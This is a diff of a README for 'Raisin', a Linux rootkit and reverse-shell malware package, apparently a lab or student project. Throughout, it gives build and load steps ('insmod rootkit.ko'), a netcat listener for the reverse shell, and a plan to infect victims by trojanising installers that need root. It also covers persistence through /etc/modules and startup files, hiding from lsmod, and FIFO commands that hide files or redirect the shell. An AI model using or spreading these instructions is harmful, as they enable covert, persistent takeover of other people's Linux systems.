@@ -1,17 +1,29 @@
-# Raisin Malware
+# Raisin Malware Ground Truth
 
 <img src="images/angry_raisin.png" width="200">
 
-The raisin malware is a combination rootkit and reverse shell application. The raisin malware uses the LKM created by [Maxim Biro](https://www.google.com) to gain root access, grape is a continuously running client that will launch a reverse shell and can then be used to send commands to the LKM.
+Raisin can be download at https://github.com/asuar078/raisin, visit page
+to see instructions with markdown translated.
 
-The rootkit only works on **Linux kernels up to 4.4.0-31** and has architecture-specific code in the rootkit which is implemented only for **x86** and **x86-64** architectures. The raisin malware was tested on a Ubuntu 14.04 VM. The reverse shell IP on the default build
+The raisin malware is a combination rootkit and reverse shell application. The
+raisin malware uses the LKM created by [Maxim
+Biro](https://github.com/nurupo/rootkit). Grape is a continuously running client
+application that will launch a reverse shell and can then be used to send
+commands to the LKM. The commands listed below, include gaining
+root access, hiding process, files and more.
+
+The rootkit only works on **Linux kernels up to 4.4.0-31** and has
+ architecture-specific code in the rootkit which is implemented only for **x86**/
+ **x86-64** architectures. The raisin malware was tested on a *Ubuntu 14.04* and
+*Ubuntu 16.04* VM. The reverse shell IP on the default build
 is set to the VM IP of `10.0.2.15` to change edit line `42` of grape.c.
 
 ## Infection Method
 
 The intention is to inject raisin into another download that requires root
 privileges to install. The installer will be altered to create the kernel module
-and grape client, then add the module to the /etc/modules file, and create a startup file for grape so both automatically run program on Linux startup.
+and grape client, then add the module to the /etc/modules file, and create a
+ startup file for grape so both automatically run program on Linux startup.
 
 ## Commands
 
@@ -33,10 +45,11 @@ and grape client, then add the module to the /etc/modules file, and create a sta
 
 1. Run `make` to create rootkit and grape client. Will need to install build
 essentials if not already installed `apt-get install build-essential`
-2. Load the rootkit using `sudo insmod rootkit.ko`, the rootkit will hide itself so it can't be seen with `lsmod` till the `unhide` command is given.
-3. Open a listener for the reverse shell using `sudo nc -lvp 443`. On the default
+2. Load the rootkit using `sudo insmod rootkit.ko`. The rootkit will hide itself
+so it can't be seen with `lsmod` till the `unhide` command is given.
+3. Open a listener for the reverse shell using `sudo nc -lvp 443`. The default
 build target IP is set for default VM IP of `10.0.2.15`.
-4. Start the grape client `./grape`, if no internet access is available grape
+4. Start the grape client `./grape`. If no internet access is available grape
 will shutdown. If you wish to remove this simple delete line `74-75` in grape.c
 and recompile.
 5. The reverse shell is now active and can be used to send commands to the host
@@ -46,15 +59,18 @@ commands to this pipe will allow access to rootkit and other functions.
 
 ## Examples Commands
 
-* `echo -n "unhide\0" > grape_fifo`
-* `echo -n "hfile ../test.txt\0" > grape_fifo`
-* `echo -n "reverse 192.168.1.1\0" > grape_fifo`
+In order to avoid errors with c strings add the '\0' to the end of the line if using two words
+
+```
+echo -n "touch" > grape_fifo
+echo -n "unhide" > grape_fifo
+echo -n "hfile ../test.txt\0" > grape_fifo
+echo -n "reverse 192.168.1.1\0" > grape_fifo
+```
 
 ## Notes
 
 * For **hfile** and **unfile** the path to the file must be from the perspective of the application where it was started.
-* In order to avoid errors with c strings add the '\0' to the end of the line.
-    `ex. echo -n "unhide\0" > grape_fifo`
 * grape will automatically close if no internet access is available.
 * Default build reverse shell IP address is set to `10.0.2.15` the default VM
 IP for testing in a VM, port `443`.
